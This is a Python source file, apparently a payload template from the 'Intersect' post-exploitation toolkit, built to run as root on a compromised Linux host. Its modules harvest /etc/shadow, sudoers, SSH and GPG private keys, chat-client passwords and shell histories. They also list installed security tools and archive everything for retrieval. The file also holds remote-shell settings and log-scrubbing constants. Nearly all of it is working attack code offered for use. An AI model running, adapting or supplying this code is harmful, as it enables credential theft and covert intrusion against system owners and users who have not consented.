#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
	option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
         pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['osuser', 'creds', 'extras', 'network', 'archive']
    PORT = 8888
    RHOST = ''
    RPORT = 8888
    PPORT = 8080
    PKEY = 'KXYRTUX'
# Enumerates cron jobs, Linux distro and kernel version, installed applications and services, user lists and user history files.
def osuser():
    print("[+] Collecting operating system and user information....")
    os.mkdir(Temp_Dir+"/osinfo/")
    os.chdir(Temp_Dir+"/osinfo/")
   
    proc = Popen('ps aux',
                 shell=True, 
                 stdout=PIPE,
                 )
    output = proc.communicate()[0]
    file = open("ps_aux.txt","a")
    for items in output:
        file.write(items),
    file.close()

    os.system("ls -alh /usr/bin > bin.txt")
    os.system("ls -alh /usr/sbin > sbin.txt")
    os.system("ls -al /etc/cron* > cronjobs.txt")
    os.system("ls -alhtr /media > media.txt")
    os.system("/usr/bin/lpstat -v > printers.txt")

    if distro == "ubuntu" or distro2 == "Ubuntu":
        os.system("dpkg -l > dpkg_list.txt")
    elif distro == "arch" or distro2 == "Arch":
        os.system("pacman -Q > pacman_list.txt")
    elif distro == "slackware" or distro2 == "Slackware":
        os.system("ls /var/log/packages > packages_list.txt")
    elif distro == "gentoo" or distro2 == "Gentoo":
        os.system("cat /var/lib/portage/world > packages.txt")
    elif distro == "centos" or distro2 == "CentOS":
        os.system("yum list installed > yum_list.txt")
    elif distro == "red hat" or distro2 == "Red Hat":
        os.system("rpm -qa > rpm_list.txt")
    else:
       pass
   
    if distro == "arch":
        os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
    elif distro == "slackware":
        os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
    elif whereis('chkconfig') is not None:
        os.system("chkconfig -A > services_list.txt")

    os.system("mount -l > mount.txt")
    os.system("cat /etc/sysctl.conf > sysctl.txt")
    os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
    os.system("uname -a > distro_kernel.txt")
    os.system("df -hT > filesystem.txt")
    os.system("free -lt > memory.txt")
    os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
    os.system("find /home -type f -iname '.*history' > HistoryList.txt")
    os.system("cat /proc/cpuinfo > cpuinfo.txt")
    os.system("cat /proc/meminfo > meminfo.txt")

    if os.path.exists(Home_Dir+"/.bash_history") is True:
        shutil.copy2(Home_Dir+"/.bash_history", "bash_history.txt")
    if os.path.exists(Home_Dir+"/.viminfo") is True:
        shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
    if os.path.exists(Home_Dir+"/.mysql_history") is True:
        shutil.copy2(Home_Dir+"/.mysql_history", "mysql_history")
   
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    content = ''
    for f in sysfiles:
        content = content + '\n' + open(f).read()
    open('SysInfo.txt','wb').write(content)
    os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
   
    os.mkdir("users/")
    os.chdir("users/")
   
    os.system("ls -alhR ~/ > CurrentUser.txt")
    os.system("ls -alhR /home > AllUsers.txt")
    if os.path.exists(Home_Dir+"/.mozilla/") is True:
        os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")

   

# Gathers user and system credentials and passwords from the remote host. We look for things like crypto keys, ssh keys, shadow files, app credentials, etc.
def creds():
    print("[+] Collecting user and system credentials....")
    os.mkdir(Temp_Dir+"/credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    content = ''
    for f in sshfiles:
       content = content + '\n' + open(f).read()
    open('SSH_Locations.txt','wb').write(content)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
    	if os.path.exists(x) is True:
    		shutil.copy2(x, Temp_Dir+"/credentials/")

    users = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
             users.append(fields[0])

    if whereis('pidgin') is not None:
        for user in users:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.znc/configs/znc.conf") is True:
            shutil.copy2("/home/"+user+"/.znc/configs/znc.conf", "znc.conf")
        else:
            pass           
            


# Search for commonly installed security measures and applications, gathers important configuration files for apps and services, tries to find source code repos.    
def extras():
    os.mkdir(Temp_Dir+"/extras")
    protectiondir = (Temp_Dir+"/extras")
    os.chdir(protectiondir)
    os.mkdir(Config_Dir)


    configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
                "/etc/bitlbee/bitlbee.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf",
                "/etc/security/access.conf", "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/apt/secring.gpg",
                "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
                "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
                "/etc/exports", "/etc/fstab", "~/.msf4/history", "/etc/ssl/openssl.cnf" ]


    for x in configs:
        if os.path.exists(x) is True:
            shutil.copy2(x, Temp_Dir+"/configs/")

    print("[+] Searching for protection and misc extras....")
    program = [ "truecrypt", "bulldog", "ufw", "iptables", "logrotate", "logwatch", 
                "chkrootkit", "clamav", "snort", "tiger", "firestarter", "avast", "lynis",
                "rkhunter", "perl", "tcpdump", "nc", "webmin", "python", "gcc", "jailkit", 
                "pwgen", "proxychains", "bastille", "wireshark", "nagios", "nmap", "firefox",
                "nagios", "tor", "openvpn", "virtualbox", "magictree", "apparmor", "git",
                "xen", "svn", "redmine", "ldap", "msfconsole" ]

    for x in program:
        location = whereis(x)
        if location is not None:
            file = open("FullList.txt","a")
            content = location + '\n'
            file.write(content)
            file.close()

               
    if os.path.exists("~/.msf4/") is True:
        os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")

# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
def network():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    content = ''
    for f in ports:
        content = content + '\n' + open(f).read()
    open('Connections.txt','wb').write(content)
    os.system("rm nstat.txt lsof.txt")
    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        file = open("IPAddresses.txt", "a")
        file.write("External IP Address: " + externalIP)
        file.write("Internal IP Address: " + localIP)
        file.write("Internal IP Range: " + IPRange)
        file.close
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    content = ''
    for f in netfiles:
        content = content + '\n' + open(f).read()
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        if os.path.exists(x) is True:
            shutil.copy2(x, networkdir)
   


# Creates a tar archive of any files and reports that are generated when you run a task
def archive():
    print("[!] Generating report archive....This might take a minute or two..")
    os.chdir(Temp_Dir)
    tar = tarfile.open("reports.tar.gz", "w:gz")
    if os.path.exists("credentials") is True:
        tar.add("credentials/")
        os.system("rm -rf credentials/")
    elif os.path.exists("network/") is True:
        tar.add("network/")
        os.system("rm -rf network/")
    elif os.path.exists("extras/") is True:
        tar.add("extras/")
        os.system("rm -rf extras/")
    elif os.path.exists("configs/") is True:
        tar.add("configs/")
        os.system("rm -rf configs/")
    elif os.path.exists("osinfo/") is True:
        tar.add("osinfo/")
        os.system("rm -rf osinfo/")
    elif os.path.exists("hosts/") is True:
        tar.add("hosts/")
        os.system("rm -rf hosts/")
    else:
        print("[!] No reports exist to archive!")
    tar.close()
    sys.exit(2)



def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('     -o   --osuser')
    print('     -c   --creds')
    print('     -e   --extras')
    print('     -n   --network')
    print('     -a   --archive')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'ocena', ['osuser', 'creds', 'extras', 'network', 'archive', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-o', '--osuser'):
            osuser()
        elif o in ('-c', '--creds'):
            creds()
        elif o in ('-e', '--extras'):
            extras()
        elif o in ('-n', '--network'):
            network()
        elif o in ('-a', '--archive'):
            archive()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])